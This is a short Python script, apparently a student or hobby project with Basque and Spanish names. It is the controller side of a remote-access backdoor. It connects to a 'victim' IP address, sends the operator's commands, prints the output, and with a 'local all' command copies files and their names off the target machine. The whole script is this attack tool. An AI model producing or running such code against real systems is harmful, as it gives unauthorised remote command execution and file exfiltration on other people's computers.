import socket 
import time


class cliente(object):
    def __init__(self,ip_biktima,portua):
        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.so.connect((ip_biktima,portua))
    
    def koneksioa(self):
        while True:
            #url
            recibido = self.so.recv(4095)
            url = str(recibido,encoding='utf-8')
            #comandoa
            mensaje = input(url + ">")
            mensaje_b = bytes(mensaje,encoding= "utf-8")
            self.so.send(mensaje_b)
            if mensaje == "local all":
                izen_a = []
                fitxa_a = []
                while True:
                    luz_rev = self.so.recv(1024)
                    print(luz_rev)
                    if int(luz_rev) == 0 :
                        break
                    self.so.send(bytes("ok",encoding = 'utf-8')) 
                    fitxategia = self.so.recv(int(luz_rev))
                    print(fitxategia)
                    self.so.send(bytes("ok",encoding = 'utf-8')) 
                    izena = self.so.recv(4095)
                    print(izena)
            #luzehera
            lu = self.so.recv(4096)
            #itxi
            if mensaje == "itxi":
                break
            #emaitza
            recibido = self.so.recv(int(lu))
            print(str(recibido,encoding = 'utf-8'))
            #ongi hartu duzula ziurtatzeko
            self.so.send(bytes("ok",encoding = "utf-8"))
        print("agur")
        self.so.close()

cliente = cliente("192.168.0.10",9996)
cliente.koneksioa()


